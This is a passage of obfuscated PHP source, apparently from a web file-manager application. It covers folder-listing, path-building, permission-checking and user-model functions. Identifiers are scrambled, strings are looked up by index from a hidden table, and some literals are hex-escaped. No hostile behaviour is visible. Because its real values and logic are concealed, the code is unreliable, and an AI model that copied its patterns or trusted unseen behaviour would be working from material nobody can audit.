$‚Òª»˜¼[$ÅûƒÜŒ¤]); if (isset($³Â·—‰õ[$…í´ÅÊá[170]][$…í´ÅÊá[185]])) { $³Â·—‰õ[$…í´ÅÊá[185]] = json_decode($³Â·—‰õ[$…í´ÅÊá[170]][$…í´ÅÊá[185]], !0); unset($³Â·—‰õ[$…í´ÅÊá[170]][$…í´ÅÊá[185]]); } } unset($³Â·—‰õ); } protected function _listAppendSourceInfo(&$”•‚ø¹‡, $Í¦”¬ÄŸ) { $ÓÍíûßí =& $_SERVER[ÓïÕü]; $Õ¼È¢ãï = Model($ÓÍíûßí[554])->listData(); $áôëáÓê = Model($ÓÍíûßí[502])->listData(); $æÚ‘ª’€ = Model($ÓÍíûßí[492])->listData(); $˜ŠÆæºŠ = Model($ÓÍíûßí[555])->listSimple(); $åùÊ”ü« = array_to_keyvalue($Õ¼È¢ãï, $ÓÍíûßí[478]); $âîãç¤ = array_to_keyvalue_group($áôëáÓê, $ÓÍíûßí[87], $ÓÍíûßí[503]); $â§Ëı´­ = array_to_keyvalue($æÚ‘ª’€, $ÓÍíûßí[87]); $ñ®»è¸ = array_to_keyvalue_group($˜ŠÆæºŠ, $ÓÍíûßí[194]); foreach ($”•‚ø¹‡ as &$¹¾ï×Ÿ) { $¹¾ï×Ÿ[$ÓÍíûßí[90]] = array($ÓÍíûßí[556] => 0, $ÓÍíûßí[557] => 0, $ÓÍíûßí[558] => 0); if (isset($â§Ëı´­[$¹¾ï×Ÿ[$ÓÍíûßí[194]]])) { $¹¾ï×Ÿ[$ÓÍíûßí[90]][$ÓÍíûßí[559]] = 1; $¹¾ï×Ÿ[$ÓÍíûßí[90]][$ÓÍíûßí[560]] = $â§Ëı´­[$¹¾ï×Ÿ[$ÓÍíûßí[194]]][$ÓÍíûßí[32]]; } if ($âîãç¤ && $åùÊ”ü« && isset($âîãç¤[$¹¾ï×Ÿ[$ÓÍíûßí[194]]])) { $¹¾ï×Ÿ[$ÓÍíûßí[90]][$ÓÍíûßí[561]] = array(); foreach ($âîãç¤[$¹¾ï×Ÿ[$ÓÍíûßí[194]]] as $ŒáÉÚ™) { $…Ìã“ø = $åùÊ”ü«[$ŒáÉÚ™]; $¹¾ï×Ÿ[$ÓÍíûßí[90]][$ÓÍíûßí[561]][] = array($ÓÍíûßí[562] => $…Ìã“ø[$ÓÍíûßí[478]], $ÓÍíûßí[497] => $…Ìã“ø[$ÓÍíûßí[32]], $ÓÍíûßí[563] => $…Ìã“ø[$ÓÍíûßí[564]]); } } if ($ñ®»è¸ && isset($ñ®»è¸[$¹¾ï×Ÿ[$ÓÍíûßí[194]]])) { $¹¾ï×Ÿ[$ÓÍíûßí[90]][$ÓÍíûßí[565]] = array(); foreach ($ñ®»è¸[$¹¾ï×Ÿ[$ÓÍíûßí[194]]] as $ø¶†—‡ñ) { $ØÂòı’• = $ÓÍíûßí[566]; if ($ø¶†—‡ñ[$ÓÍíûßí[567]] == $ÓÍíûßí[91]) { $ØÂòı’• .= $ÓÍíûßí[568]; } $¹¾ï×Ÿ[$ÓÍíûßí[90]][$ÓÍíûßí[565]] = array_field_key($ø¶†—‡ñ, explode($ÓÍíûßí[50], $ØÂòı’•)); } } } unset($¹¾ï×Ÿ); return $”•‚ø¹‡; } protected function _listAppendChildren(&$¦Á‘øôœ, $Íüò˜şô) { $³­îËØ” =& $_SERVER[ÓïÕü]; $‚áœÛöˆ = array(); $õóğÔ§ñ = array($³­îËØ”[242] => 0, $³­îËØ”[243] => 0); foreach ($¦Á‘øôœ as &$¡êŒÂØâ) { if (!$¡êŒÂØâ[$³­îËØ”[488]]) { continue; } $‚áœÛöˆ[] = $¡êŒÂØâ[$³­îËØ”[194]]; } unset($¡êŒÂØâ); if (!$‚áœÛöˆ) { return; } $Íìöš¦Ñ = array($³­îËØ”[193] => array($³­îËØ”[7], $‚áœÛöˆ), $³­îËØ”[508] => 0); $õ¿Ù½Ñ¸ = array($³­îËØ”[193], $³­îËØ”[488], $³­îËØ”[569] => $³­îËØ”[570]); $™¿Ä±² = $this->field($õ¿Ù½Ñ¸)->where($Íìöš¦Ñ)->group($³­îËØ”[571])->select(); $Ù›±ê„€ = array(); foreach ($™¿Ä±² as $¦‹é´ù) { $âğÂ¤©– = $¦‹é´ù[$³­îËØ”[193]]; $î«µİ¯ß = $¦‹é´ù[$³­îËØ”[488]] == $³­îËØ”[91] ? $³­îËØ”[243] : $³­îËØ”[242]; if (!isset($Ù›±ê„€[$âğÂ¤©–])) { $Ù›±ê„€[$âğÂ¤©–] = array($³­îËØ”[242] => 0, $³­îËØ”[243] => 0); } $Ù›±ê„€[$âğÂ¤©–][$î«µİ¯ß] += $¦‹é´ù[$³­îËØ”[570]]; } foreach ($¦Á‘øôœ as &$¡êŒÂØâ) { if (!$¡êŒÂØâ[$³­îËØ”[488]]) { continue; } $˜ò¯ = is_array($Ù›±ê„€[$¡êŒÂØâ[$³­îËØ”[194]]]) ? $Ù›±ê„€[$¡êŒÂØâ[$³­îËØ”[194]]] : $õóğÔ§ñ; $¡êŒÂØâ[$³­îËØ”[243]] = $˜ò¯[$³­îËØ”[243]]; $¡êŒÂØâ[$³­îËØ”[242]] = $˜ò¯[$³­îËØ”[242]]; unset($¡êŒÂØâ[$³­îËØ”[489]]); } unset($¡êŒÂØâ); } protected function _listAppendAuth(&$üÚëî‘) { $³Ê¿–¹· =& $_SERVER[ÓïÕü]; $÷¨Öúé = array(); foreach ($üÚëî‘ as $í…Ú¸„Ã) { if ($í…Ú¸„Ã[$³Ê¿–¹·[191]] == self::TYPE_GROUP) { $÷¨Öúé[] = $í…Ú¸„Ã[$³Ê¿–¹·[194]]; } } if (!$÷¨Öúé) { return; } $ğó¯³«¨ = array_to_keyvalue($üÚëî‘, $³Ê¿–¹·[194]); $ÉÖå»ÅÌ = Model($³Ê¿–¹·[572])->getSourceList($÷¨Öúé, $ğó¯³«¨); $Ô•Š¯Âà = KodUser::isRoot(); foreach ($üÚëî‘ as $°Íì‡Î => &$í…Ú¸„Ã) { $í…Ú¸„Ã[$³Ê¿–¹·[490]] = $ÉÖå»ÅÌ[$í…Ú¸„Ã[$³Ê¿–¹·[194]]]; if (!$í…Ú¸„Ã[$³Ê¿–¹·[490]] && $í…Ú¸„Ã[$³Ê¿–¹·[191]] == self::TYPE_GROUP) { $í…Ú¸„Ã[$³Ê¿–¹·[490]] = Action($³Ê¿–¹·[573])->pathGroupAuthMake($í…Ú¸„Ã[$³Ê¿–¹·[574]]); if (!$í…Ú¸„Ã[$³Ê¿–¹·[490]] && !$Ô•Š¯Âà) { $í…Ú¸„Ã[$³Ê¿–¹·[236]] = !1; $í…Ú¸„Ã[$³Ê¿–¹·[235]] = !1; } } if ($í…Ú¸„Ã[$³Ê¿–¹·[490]]) { $í…Ú¸„Ã[$³Ê¿–¹·[236]] = AuthModel::authCheckEdit($í…Ú¸„Ã[$³Ê¿–¹·[490]][$³Ê¿–¹·[491]]); $í…Ú¸„Ã[$³Ê¿–¹·[235]] = AuthModel::authCheckView($í…Ú¸„Ã[$³Ê¿–¹·[490]][$³Ê¿–¹·[491]]); } $this->groupPathDisplay($í…Ú¸„Ã); } unset($í…Ú¸„Ã); } public function _listAppendAuthSecret(&$ß‹±«¢‰) { $Ö¥ªŸ— =& $_SERVER[ÓïÕü]; if (Model($Ö¥ªŸ—[511])->get($Ö¥ªŸ—[575]) != $Ö¥ªŸ—[91]) { return; } static $¼Í—ÖäÌ = false; if (!$¼Í—ÖäÌ) { $£—É¥·ª = Model($Ö¥ªŸ—[576]); $²ƒ€º†Ø = Model($Ö¥ªŸ—[577]); $¼Í—ÖäÌ = $²ƒ€º†Ø->listData(); $¼Í—ÖäÌ = array_to_keyvalue($¼Í—ÖäÌ, $Ö¥ªŸ—[194]); $°¥ˆâõƒ = json_decode(Model($Ö¥ªŸ—[511])->get($Ö¥ªŸ—[578]), !0); $°¥ˆâõƒ = array_to_keyvalue($°¥ˆâõƒ, $Ö¥ªŸ—[478]); foreach ($¼Í—ÖäÌ as $‚§§²¿à => $”Ë™ÚÔ) { $Ú¶Ç¢Å = $°¥ˆâõƒ[$”Ë™ÚÔ[$Ö¥ªŸ—[579]]]; if (!$Ú¶Ç¢Å) { $²ƒ€º†Ø->remove($”Ë™ÚÔ[$Ö¥ªŸ—[478]]); unset($¼Í—ÖäÌ[$‚§§²¿à]); continue; } $—ê´¢ô¼ = $£—É¥·ª->listData($Ú¶Ç¢Å[$Ö¥ªŸ—[490]]); if (!$—ê´¢ô¼) { $²ƒ€º†Ø->remove($”Ë™ÚÔ[$Ö¥ªŸ—[478]]); unset($¼Í—ÖäÌ[$‚§§²¿à]); continue; } $”Ë™ÚÔ[$Ö¥ªŸ—[490]] = $—ê´¢ô¼; $”Ë™ÚÔ[$Ö¥ªŸ—[580]] = $Ú¶Ç¢Å; $”Ë™ÚÔ[$Ö¥ªŸ—[581]] = Model($Ö¥ªŸ—[582])->getInfoSimpleOuter($”Ë™ÚÔ[$Ö¥ªŸ—[530]]); $¼Í—ÖäÌ[$‚§§²¿à] = $”Ë™ÚÔ; } } $ÆÏ÷í­æ = USER_ID; $‚òö™ÃÜ = array(); $¥å´¯Ö£ = $this->_listAppendPath($‚òö™ÃÜ, !0); foreach ($ß‹±«¢‰ as $‚§§²¿à => &$”Ë™ÚÔ) { if (!is_array($”Ë™ÚÔ[$Ö¥ªŸ—[490]])) { continue; } if ($”Ë™ÚÔ[$Ö¥ªŸ—[191]] != $Ö¥ªŸ—[583]) { continue; } if (isset($¼Í—ÖäÌ[$”Ë™ÚÔ[$Ö¥ªŸ—[194]]])) { $¹ÁÉïßÎ = $¼Í—ÖäÌ[$”Ë™ÚÔ[$Ö¥ªŸ—[194]]]; if (!is_array($”Ë™ÚÔ[$Ö¥ªŸ—[544]])) { $”Ë™ÚÔ[$Ö¥ªŸ—[544]] = array(); } $”Ë™ÚÔ[$Ö¥ªŸ—[544]][$Ö¥ªŸ—[584]] = $¹ÁÉïßÎ[$Ö¥ªŸ—[579]]; $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[585]] = $¹ÁÉïßÎ; $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[586]] = $”Ë™ÚÔ[$Ö¥ªŸ—[587]]; $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[588]] = $Ö¥ªŸ—[91]; if ($¹ÁÉïßÎ[$Ö¥ªŸ—[530]] != $ÆÏ÷í­æ) { $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[491]] = $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[491]] & $¹ÁÉïßÎ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[490]]; } continue; } $ÊíÓ•Òû = $this->parentLevelArray($”Ë™ÚÔ[$Ö¥ªŸ—[589]]); $‰åô¯ş = array_reverse($ÊíÓ•Òû); foreach ($‰åô¯ş as $ßƒ“Ù­¿ => $¬ª¨„‘) { if (!isset($¼Í—ÖäÌ[$¬ª¨„‘])) { continue; } $¹ÁÉïßÎ = $¼Í—ÖäÌ[$¬ª¨„‘]; $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[585]] = $¹ÁÉïßÎ; if ($¹ÁÉïßÎ[$Ö¥ªŸ—[530]] != $ÆÏ÷í­æ) { $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[491]] = $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[491]] & $¹ÁÉïßÎ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[490]]; } $‹¢¸‹¢¶ = $Ö¥ªŸ—[12]; $öíÍêô = count($ÊíÓ•Òû) - $ßƒ“Ù­¿; for ($±õĞŒû = 0; $±õĞŒû < $öíÍêô; $±õĞŒû++) { if (!isset($¥å´¯Ö£[$ÊíÓ•Òû[$±õĞŒû]])) { $‹¢¸‹¢¶ = $Ö¥ªŸ—[12]; break; } $‹¢¸‹¢¶ = $‹¢¸‹¢¶ . rtrim($¥å´¯Ö£[$ÊíÓ•Òû[$±õĞŒû]], $Ö¥ªŸ—[8]) . $Ö¥ªŸ—[8]; } $”Ë™ÚÔ[$Ö¥ªŸ—[490]][$Ö¥ªŸ—[586]] = rtrim($‹¢¸‹¢¶, $Ö¥ªŸ—[8]) . $Ö¥ªŸ—[8]; break; } } unset($”Ë™ÚÔ); } public function groupPathDisplay(&$˜òÈ…şè) { $°Ø‘ÒùÕ =& $_SERVER[ÓïÕü]; if ($˜òÈ…şè[$°Ø‘ÒùÕ[191]] != self::TYPE_GROUP) { return; } $öü¬ÍÏÆ = Model($°Ø‘ÒùÕ[590])->getInfo($˜òÈ…şè[$°Ø‘ÒùÕ[574]]); $‰Ø¤Œİ = $this->parentLevelArray($öü¬ÍÏÆ[$°Ø‘ÒùÕ[589]]); $ôôÆ×Ë = $°Ø‘ÒùÕ[12]; foreach ($‰Ø¤Œİ as $¤€ş«…) { $è‚ŠıÌš = Model($°Ø‘ÒùÕ[590])->getInfo($¤€ş«…); $ôôÆ×Ë .= $è‚ŠıÌš[$°Ø‘ÒùÕ[90]][$°Ø‘ÒùÕ[194]] . $°Ø‘ÒùÕ[50]; } $˜òÈ…şè[$°Ø‘ÒùÕ[591]] = $öü¬ÍÏÆ[$°Ø‘ÒùÕ[193]]; $˜òÈ…şè[$°Ø‘ÒùÕ[592]] = $öü¬ÍÏÆ[$°Ø‘ÒùÕ[589]]; $˜òÈ…şè[$°Ø‘ÒùÕ[593]] = $öü¬ÍÏÆ[$°Ø‘ÒùÕ[594]]; $˜òÈ…şè[$°Ø‘ÒùÕ[595]] = $ôôÆ×Ë . $öü¬ÍÏÆ[$°Ø‘ÒùÕ[90]][$°Ø‘ÒùÕ[194]]; } protected function _listAppendPath(&$æé€ºÅ¯, $‹êàŒ×î = false) { $á±× =& $_SERVER[ÓïÕü]; static $“¿÷†ƒ = array(); $¸¿ô¨«— = array(); $òıÜõîÁ = array(); if ($‹êàŒ×î) { return $“¿÷†ƒ; } foreach ($æé€ºÅ¯ as &$‚çÉ„•) { $„¡ÃÙÒ = $‚çÉ„•[$á±×[194]]; if ($‚çÉ„•[$á±×[488]] == $á±×[91] && $‚çÉ„•[$á±×[193]] != 0) { $“¿÷†ƒ[$„¡ÃÙÒ] = $‚çÉ„•[$á±×[32]]; } if ($‚çÉ„•[$á±×[488]] == $á±×[91] && $‚çÉ„•[$á±×[193]] == 0) { $“¿÷†ƒ[$„¡ÃÙÒ] = $this->_listAppendPathRoot($‚çÉ„•, array()); } if (isset($òıÜõîÁ[$‚çÉ„•[$á±×[589]]])) { continue; } $òıÜõîÁ[$‚çÉ„•[$á±×[589]]] = !0; $‚„ï†Î˜ = $this->parentLevelArray($‚çÉ„•[$á±×[589]]); foreach ($‚„ï†Î˜ as $õê®ª± => $¯äÒÔÁÕ) { if (isset($“¿÷†ƒ[$¯äÒÔÁÕ])) { continue; } if ($õê®ª± == 0) { $“¿÷†ƒ[$¯äÒÔÁÕ] = $this->_listAppendPathRoot($‚çÉ„•, $‚„ï†Î˜); } if ($õê®ª± != 0) { $¸¿ô¨«—[] = $¯äÒÔÁÕ; } } } unset($‚çÉ„•); $¸¿ô¨«— = array_unique($¸¿ô¨«—); if (count($¸¿ô¨«—) > 0) { $²ÇÂşÒº = array($á±×[494] => array($á±×[495], $¸¿ô¨«—)); if (count($¸¿ô¨«—) == 1) { $“ï‹—Ø = $this->sourceInfo($¸¿ô¨«—[0]); $Æ¢ÂŠ«¹ = is_array($“ï‹—Ø) ? array($“ï‹—Ø) : !1; } else { $Æ¢ÂŠ«¹ = $this->field($á±×[596])->where($²ÇÂşÒº)->select(); } if (!$Æ¢ÂŠ«¹) { $Æ¢ÂŠ«¹ = array(); } foreach ($Æ¢ÂŠ«¹ as $ËˆÏ¬»€) { $“¿÷†ƒ[$ËˆÏ¬»€[$á±×[194]]] = $ËˆÏ¬»€[$á±×[32]]; } } $´ñÙµçó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ŞıíÖß = array(); foreach ($æé€ºÅ¯ as &$‚çÉ„•) { $–‹Å®•ù = $‚çÉ„•[$á±×[589]]; $ï‚ìüÓ = $á±×[12]; if (isset($ŞıíÖß[$–‹Å®•ù])) { $ï‚ìüÓ = $ŞıíÖß[$–‹Å®•ù]; } else { $‚„ï†Î˜ = $this->parentLevelArray($‚çÉ„•[$á±×[589]]); foreach ($‚„ï†Î˜ as $õê®ª± => $¯äÒÔÁÕ) { if (isset($“¿÷†ƒ[$¯äÒÔÁÕ])) { $ï‚ìüÓ .= $“¿÷†ƒ[$¯äÒÔÁÕ] . $á±×[8]; } } $ŞıíÖß[$–‹Å®•ù] = $ï‚ìüÓ; } $ï‚ìüÓ .= $‚çÉ„•[$á±×[32]]; if ($‚çÉ„•[$á±×[488]] == $á±×[91]) { $ï‚ìüÓ .= $á±×[8]; } $‚çÉ„•[$á±×[587]] = str_replace($á±×[257], $á±×[8], $ï‚ìüÓ); if ($‚çÉ„•[$á±×[193]] == $á±×[231]) { $‚çÉ„•[$á±×[32]] = trim($“¿÷†ƒ[$‚çÉ„•[$á±×[194]]], $á±×[8]); $‚çÉ„•[$á±×[587]] = $‚çÉ„•[$á±×[32]] . $á±×[8]; } if (intval($‚çÉ„•[$á±×[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‚çÉ„•, $‚„ï†Î˜, $´ñÙµçó); } } unset($‚çÉ„•); return $æé€ºÅ¯; } private function _listAppendPathRecycle(&$€‰¶Ë«¡, $ö½øİ­«, $Ó°æ©ã) { $ØÛŒÚƒ• =& $_SERVER[ÓïÕü]; if (!in_array($Ó°æ©ã, $ö½øİ­«) && $€‰¶Ë«¡[$ØÛŒÚƒ•[194]] != $Ó°æ©ã) { return; } $‰÷ÏĞçÓ = explode($ØÛŒÚƒ•[8], trim($€‰¶Ë«¡[$ØÛŒÚƒ•[587]], $ØÛŒÚƒ•[8])); $–›Ïéµù = implode($ØÛŒÚƒ•[8], array_slice($‰÷ÏĞçÓ, 2)); $€‰¶Ë«¡[$ØÛŒÚƒ•[587]] = $ØÛŒÚƒ•[8] . LNG($ØÛŒÚƒ•[597]) . $ØÛŒÚƒ•[8] . ltrim($–›Ïéµù, $ØÛŒÚƒ•[8]); $€‰¶Ë«¡[$ØÛŒÚƒ•[589]] = $ØÛŒÚƒ•[598] . implode($ØÛŒÚƒ•[50], array_slice($ö½øİ­«, 1)) . $ØÛŒÚƒ•[50]; if ($€‰¶Ë«¡[$ØÛŒÚƒ•[194]] == $Ó°æ©ã) { $€‰¶Ë«¡[$ØÛŒÚƒ•[589]] = $ØÛŒÚƒ•[598]; $€‰¶Ë«¡[$ØÛŒÚƒ•[193]] = $ØÛŒÚƒ•[231]; $€‰¶Ë«¡[$ØÛŒÚƒ•[32]] = LNG($ØÛŒÚƒ•[597]); } $€‰¶Ë«¡[$ØÛŒÚƒ•[599]] = $ØÛŒÚƒ•[600]; } protected function _listAppendPathRoot(&$÷ï¶ñïé, $Û¾÷·®á) { $ïíâü =& $_SERVER[ÓïÕü]; static $ˆ—¦öƒ” = false; static $ƒÌ ¯Û = false; $ñÜ…åÃü = $ïíâü[12]; if ($÷ï¶ñïé[$ïíâü[191]] == self::TYPE_USER) { if ($÷ï¶ñïé[$ïíâü[574]] == USER_ID) { $ñÜ…åÃü = LNG($ïíâü[601]); if ($ˆ—¦öƒ” === !1) { $¸—³® = Model($ïíâü[602])->getInfoFull(USER_ID); $ˆ—¦öƒ” = _get($¸—³®, $ïíâü[603], $ïíâü[12]); } if ($ƒÌ ¯Û === !1) { $¸—³® = Model($ïíâü[602])->getInfoFull(USER_ID); $ƒÌ ¯Û = _get($¸—³®, $ïíâü[604], $ïíâü[12]); } if ($Û¾÷·®á && $Û¾÷·®á[0] == $ˆ—¦öƒ” || !$Û¾÷·®á && $÷ï¶ñïé[$ïíâü[194]] == $ˆ—¦öƒ”) { $ñÜ…åÃü = LNG($ïíâü[605]); $÷ï¶ñïé[$ïíâü[606]] = $ïíâü[607]; } if ($Û¾÷·®á && $Û¾÷·®á[0] == $ƒÌ ¯Û || !$Û¾÷·®á && $÷ï¶ñïé[$ïíâü[194]] == $ƒÌ ¯Û) { $ñÜ…åÃü = $ñÜ…åÃü . $ïíâü[608] . LNG($ïíâü[609]); } if (!$Û¾÷·®á) { $÷ï¶ñïé[$ïíâü[32]] = $ñÜ…åÃü; } } else { $¸—³® = Model($ïíâü[602])->getInfoFull($÷ï¶ñïé[$ïíâü[574]]); $ùØä×«œ = _get($¸—³®, $ïíâü[604], $ïíâü[12]); $÷ï¶ñïé[$ïíâü[610]] = Model($ïíâü[582])->getInfoSimpleOuter($÷ï¶ñïé[$ïíâü[574]]); $ñÜ…åÃü = LNG($ïíâü[611]) . $ïíâü[176] . $÷ï¶ñïé[$ïíâü[610]][$ïíâü[32]] . $ïíâü[178]; if ($Û¾÷·®á && $Û¾÷·®á[0] == $ùØä×«œ || !$Û¾÷·®á && $÷ï¶ñïé[$ïíâü[194]] == $ùØä×«œ) { $ñÜ…åÃü = LNG($ïíâü[611]) . $ïíâü[612] . $÷ï¶ñïé[$ïíâü[610]][$ïíâü[32]] . $ïíâü[608] . LNG($ïíâü[609]) . $ïíâü[178]; } } } else { if ($÷ï¶ñïé[$ïíâü[191]] == self::TYPE_GROUP) { $Ö®ñ—á§ = Model($ïíâü[590])->getInfoSimple($÷ï¶ñïé[$ïíâü[574]]); $ñÜ…åÃü = $Ö®ñ—á§[$ïíâü[32]]; } else { if ($÷ï¶ñïé[$ïíâü[191]] == self::TYPE_SYSTEM) { $ñÜ…åÃü = $ïíâü[613]; } } } $ñÜ…åÃü = $ñÜ…åÃü ? $ïíâü[8] . $ñÜ…åÃü . $ïíâü[8] : $ïíâü[8]; return $ñÜ…åÃü; } protected function _listAppendUser(&$ó¡ °ËŸ) { $Çº‘×ë– =& $_SERVER[ÓïÕü]; $¢¼±úç = array_to_keyvalue($ó¡ °ËŸ, $Çº‘×ë–[12], $Çº‘×ë–[530]); $¨¥ÎÉç– = array_to_keyvalue($ó¡ °ËŸ, $Çº‘×ë–[12], $Çº‘×ë–[532]); $‡Ìö = array_merge($¢¼±úç, $¨¥ÎÉç–); $ÁçÃñšÎ = Model($Çº‘×ë–[602])->userListInfo($‡Ìö); foreach ($ó¡ °ËŸ as &$Ì­çõûğ) { $æ¨ş×„ = $Ì­çõûğ[$Çº‘×ë–[530]]; $Ì­çõûğ[$Çº‘×ë–[530]] = $ÁçÃñšÎ[$æ¨ş×„] ? $ÁçÃñšÎ[$æ¨ş×„] : !1; $æ¨ş×„ = $Ì­çõûğ[$Çº‘×ë–[532]]; $Ì­çõûğ[$Çº‘×ë–[532]] = $ÁçÃñšÎ[$æ¨ş×„] ? $ÁçÃñšÎ[$æ¨ş×„] : !1; if (_get($Ì­çõûğ, $Çº‘×ë–[614], 0)) { $áÙ°ü­– = $GLOBALS[$Çº‘×ë–[6]][$Çº‘×ë–[92]][$Çº‘×ë–[615]]; if ($Ì­çõûğ[$Çº‘×ë–[544]][$Çº‘×ë–[616]] <= time() - $áÙ°ü­–) { $this->metaSet($Ì­çõûğ[$Çº‘×ë–[194]], $Çº‘×ë–[617], null); $this->metaSet($Ì­çõûğ[$Çº‘×ë–[194]], $Çº‘×ë–[616], null); unset($Ì­çõûğ[$Çº‘×ë–[544]][$Çº‘×ë–[617]]); continue; } $‘¢º² = $Ì­çõûğ[$Çº‘×ë–[544]][$Çº‘×ë–[617]]; $Ì­çõûğ[$Çº‘×ë–[544]][$Çº‘×ë–[618]] = Model($Çº‘×ë–[602])->getInfoSimpleOuter($‘¢º²); } } unset($Ì­çõûğ); } public function parentLevelArray($Ÿ‡ÁÊ) { $ıÒÕ® ü =& $_SERVER[ÓïÕü]; $Ÿ‡ÁÊ = explode($ıÒÕ® ü[50], trim($Ÿ‡ÁÊ, $ıÒÕ® ü[50])); return array_remove_value($Ÿ‡ÁÊ, $ıÒÕ® ü[231]); } public function listAll($şÊò»•Û) { $”…Éí„ =& $_SERVER[ÓïÕü]; $§ÂëÌş’ = $this->sourceInfo($şÊò»•Û); $•Á¶‹è† = array($”…Éí„[619] => array($”…Éí„[620], $§ÂëÌş’[$”…Éí„[589]] . $şÊò»•Û . $”…Éí„[621]), $”…Éí„[622] => 0); $æ¤ëË¦é = $”…Éí„[623]; $è‹’±ùì = "\114\x45\x46\x54\40\112\x4f\x49\116\40{$this->tablePrefix}\151\157\137\x66\151\x6c\x65\x20\146\151\x6c\145\x20\157\x6e\x20\163\x6f\x75\162\x63\145\x2e\146\151\x6c\145\111\x44\x20\x3d\x20\146\x69\x6c\x65\56\146\151\x6c\x65\x49\x44"; $ô¸™àÈü = $this->alias($”…Éí„[522])->field($æ¤ëË¦é)->where($•Á¶‹è†)->join($è‹’±ùì)->select(); $this->_listAppendAuth($ô¸™àÈü); $this->_listAppendUser($ô¸™àÈü); $this->_listAppendPath($ô¸™àÈü); $ô¸™àÈü = array_to_keyvalue($ô¸™àÈü, $”…Éí„[194]); $şÓÄ‰ = "\x2f{$§ÂëÌş’[$”…Éí„[32]]}\57"; $şÓÄ‰ = $şÓÄ‰ == $”…Éí„[257] ? $”…Éí„[8] : $şÓÄ‰; $ÏÌ”¿´ = array(); foreach ($ô¸™àÈü as $çŸ¹œ«ç => $ç½¼²¾±) { $òÃïÌ¤ï = $this->parentLevelArray($ç½¼²¾±[$”…Éí„[589]]); array_shift($òÃïÌ¤ï); $Â•³«×© = $şÓÄ‰; for ($Àš¢ÒËù = 0; $Àš¢ÒËù < count($òÃïÌ¤ï); $Àš¢ÒËù++) { $Â•³«×© .= $ô¸™àÈü[$òÃïÌ¤ï[$Àš¢ÒËù]][$”…Éí„[32]] . $”…Éí„[8]; } $Â•³«×© .= $ç½¼²¾±[$”…Éí„[32]]; if ($ç½¼²¾±[$”…Éí„[488]]) { $Â•³«×© .= $”…Éí„[8]; } $ªÖ´Á—Œ = array($”…Éí„[498] => str_replace($”…Éí„[257], $”…Éí„[8], str_replace($”…Éí„[257], $”…Éí„[8], str_replace($”…Éí„[257], $”…Éí„[8], $Â•³«×©))), $”…Éí„[624] => intval($ç½¼²¾±[$”…Éí„[488]]), $”…Éí„[625] => intval($ç½¼²¾±[$”…Éí„[79]]), $”…Éí„[88] => intval($ç½¼²¾±[$”…Éí„[88]]), $”…Éí„[90] => $this->pathInfoFilter($ç½¼²¾±)); if (!$ªÖ´Á—Œ[$”…Éí„[488]]) { $ªÖ´Á—Œ[$”…Éí„[546]] = $ç½¼²¾±[$”…Éí„[546]]; } $ÏÌ”¿´[] = $ªÖ´Á—Œ; } $ÏÌ”¿´ = array_sort_by($ÏÌ”¿´, $”…Éí„[87]); return $ÏÌ”¿´; } } goto Cïº¾¾ÉİÃ; Fµ¤°¾êÈ: class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\x6d\x65" => "\x75\163\x65\x72\137\x6d\x65\164\141", "\155\145\164\141\x46\151\145\154\144" => "\165\163\145\162\111\104"); protected $simpleField = "\x75\x73\145\x72\x49\104\x2c\156\x69\x63\153\116\141\155\145\x2c\x6e\x61\x6d\145\x2c\141\166\x61\x74\141\x72\54\163\x65\x78\x2c\x73\164\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ìáàö“Ò) { $ÔÕ”° „ =& $_SERVER[ÓïÕü]; $·Æ™Èì£ = $ÔÕ”° „[2501]; return array($ÔÕ”° „[2088] => array($ìáàö“Ò[0], $·Æ™Èì£), $ÔÕ”° „[2090] => array($ìáàö“Ò[0], $·Æ™Èì£), $ÔÕ”° „[2502] => array($ìáàö“Ò[0], $·Æ™Èì£)); } protected function getInfo($½ƒ•±äí, $Üìœ“ÓĞ = false) { $ßª”§¾Â = $this->getInfoSimple($½ƒ•±äí); if (!is_array($ßª”§¾Â)) { return array(); } if ($Üìœ“ÓĞ) { return $this->_getInfoApply($ßª”§¾Â); } return $this->cacheFunctionGet($_SERVER[ÓïÕü][2092], $½ƒ•±äí); } protected function getInfoFull($Ë·åÏ¤İ, $É¶ûŞ¢ = false) { $¿ÕºìÚã = $this->getInfoSimple($Ë·åÏ¤İ); if (!is_array($¿ÕºìÚã)) { return array(); } if ($É¶ûŞ¢) { return $this->_getInfoApply($¿ÕºìÚã, !0); } return $this->cacheFunctionGet($_SERVER[ÓïÕü][2503], $Ë·åÏ¤İ); } private function _getInfoApply($¾Û¢šê, $»¥‘÷ê­ = false) { $ğÁ’ „ =& $_SERVER[ÓïÕü]; if (!$¾Û¢šê) { return $¾Û¢šê; } $§¾Ô—–ö = md5($ğÁ’ „[2504] . $¾Û¢šê[$ğÁ’ „[993]] . $ğÁ’ „[2505] . $¾Û¢šê[$ğÁ’ „[32]]); $¾Û¢šê = $this->_listDataApplyItem($¾Û¢šê); $Ïí£È¦— = Model($ğÁ’ „[1456])->metaGet($¾Û¢šê[$ğÁ’ „[90]][$ğÁ’ „[194]]); $¾Û¢šê[$ğÁ’ „[2506]] = $§¾Ô—–ö; $¾Û¢šê[$ğÁ’ „[90]][$ğÁ’ „[2290]] = isset($Ïí£È¦—[$ğÁ’ „[2291]]) ? $Ïí£È¦—[$ğÁ’ „[2291]] : null; if 